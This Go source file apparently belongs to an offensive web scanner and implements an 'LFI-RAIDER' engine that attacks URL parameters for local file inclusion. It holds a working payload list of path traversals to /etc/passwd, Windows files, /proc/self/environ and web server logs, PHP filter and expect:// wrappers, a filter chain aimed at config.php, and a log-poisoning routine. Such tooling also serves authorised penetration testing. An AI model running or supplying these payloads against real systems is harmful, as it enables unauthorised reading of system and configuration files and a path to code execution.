package web

import (
	"fmt"
	"io"
	"strings"

	"github.com/nexus-void/nexus-void/pkg/utils"
)

// LFIRaider is the Local File Inclusion testing engine
type LFIRaider struct {
	Target string
}

// LFIResult represents a confirmed LFI finding
type LFIResult struct {
	URL       string `json:"url"`
	Parameter string `json:"parameter"`
	Payload   string `json:"payload"`
	FileRead  string `json:"file_read"`
	Proof     string `json:"proof"`
	Severity  string `json:"severity"`
}

func NewLFIRaider(target string) *LFIRaider {
	return &LFIRaider{Target: target}
}

// TestURL tests a URL for LFI vulnerabilities
func (l *LFIRaider) TestURL(targetURL string, params []string) []LFIResult {
	fmt.Printf("[+] LFI-RAIDER scanning: %s\n", targetURL)

	var results []LFIResult

	if len(params) == 0 {
		params = []string{"file", "page", "path", "include", "dir", "doc", "document", "view", "content", "template", "component"}
	}

	for _, param := range params {
		if r := l.testLFI(targetURL, param); r != nil {
			results = append(results, *r)
		}
	}

	fmt.Printf("[+] LFI-RAIDER found %d LFI vulnerabilities\n", len(results))
	return results
}

func (l *LFIRaider) testLFI(targetURL, param string) *LFIResult {
	lfiPayloads := []struct {
		payload  string
		check    string
		fileName string
	}{
		{"../../../../etc/passwd", "root:", "/etc/passwd"},
		{"../../../../etc/passwd%00", "root:", "/etc/passwd"},
		{"....//....//....//etc/passwd", "root:", "/etc/passwd"},
		{"../../../../../../etc/passwd", "root:", "/etc/passwd"},
		{"/etc/passwd", "root:", "/etc/passwd"},
		{"file:///etc/passwd", "root:", "/etc/passwd"},
		{"../../../../windows/win.ini", "[fonts]", "win.ini"},
		{"../../../../windows/system32/drivers/etc/hosts", "localhost", "hosts"},
		{"php://filter/convert.base64-encode/resource=/etc/passwd", "cm9vd", "/etc/passwd (base64)"},
		{"php://filter/read=string.rot13/resource=/etc/passwd", "ebbg", "/etc/passwd (rot13)"},
		{"expect://id", "uid=", "expect wrapper"},
		{"data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==", "phpinfo", "data wrapper"},
		{"/proc/self/environ", "HTTP_USER_AGENT", "proc/self/environ"},
		{"../../../../var/log/apache2/access.log", "GET /", "apache access log"},
	}

	for _, test := range lfiPayloads {
		injectedURL := injectPayload(targetURL, param, test.payload)
		resp, err := utils.Fetch(injectedURL, nil)
		if err != nil {
			continue
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		bodyStr := string(body)

		// Check for file content indicators
		if strings.Contains(bodyStr, test.check) {
			return &LFIResult{
				URL:       targetURL,
				Parameter: param,
				Payload:   test.payload,
				FileRead:  test.fileName,
				Proof:     fmt.Sprintf("File content detected: '%s'", test.check),
				Severity:  "critical",
			}
		}

		// Check for base64 output (PHP filter)
		if strings.Contains(test.payload, "base64") && isBase64Like(bodyStr[:minLen(100, len(bodyStr))]) {
			return &LFIResult{
				URL:       targetURL,
				Parameter: param,
				Payload:   test.payload,
				FileRead:  test.fileName,
				Proof:     "Base64 encoded file content detected",
				Severity:  "critical",
			}
		}
	}

	return nil
}

// TestPHPFilterChains tests PHP filter chains for arbitrary file read
func (l *LFIRaider) TestPHPFilterChains(targetURL, param string) *LFIResult {
	filterChain := "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7/resource="

	files := []string{"/etc/passwd", "/etc/hosts", "index.php", "config.php"}

	for _, file := range files {
		payload := filterChain + file
		injectedURL := injectPayload(targetURL, param, payload)
		resp, err := utils.Fetch(injectedURL, nil)
		if err != nil {
			continue
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		if isBase64Like(string(body)) {
			return &LFIResult{
				URL:       targetURL,
				Parameter: param,
				Payload:   payload,
				FileRead:  file,
				Proof:     "PHP filter chain extracted file (base64 output)",
				Severity:  "critical",
			}
		}
	}

	return nil
}

// LogPoisoning attempts log file poisoning via User-Agent
func (l *LFIRaider) LogPoisoning(targetURL, param string) *LFIResult {
	poisonMarker := "NXV-P0IS0N-MARKER"

	// First, poison the log via User-Agent
	poisonHeaders := map[string]string{
		"User-Agent": poisonMarker,
	}

	resp, err := utils.Fetch(targetURL, poisonHeaders)
	if err != nil {
		return nil
	}
	resp.Body.Close()

	// Then try to include the poisoned log
	logPaths := []string{
		"../../../../var/log/apache2/access.log",
		"../../../../var/log/httpd/access.log",
		"../../../../var/log/nginx/access.log",
		"../../../../proc/self/environ",
	}

	for _, logPath := range logPaths {
		injectedURL := injectPayload(targetURL, param, logPath)
		resp, err := utils.Fetch(injectedURL, nil)
		if err != nil {
			continue
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		if strings.Contains(string(body), poisonMarker) {
			return &LFIResult{
				URL:       targetURL,
				Parameter: param,
				Payload:   logPath,
				FileRead:  logPath,
				Proof:     "Log poisoning successful - marker found in log file",
				Severity:  "critical",
			}
		}
	}

	return nil
}

func isBase64Like(s string) bool {
	if len(s) < 4 {
		return false
	}
	for _, c := range s[:minLen(50, len(s))] {
		if !((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9') || c == '+' || c == '/' || c == '=') {
			return false
		}
	}
	return true
}

func minLen(a, b int) int {
	if a < b {
		return a
	}
	return b
}
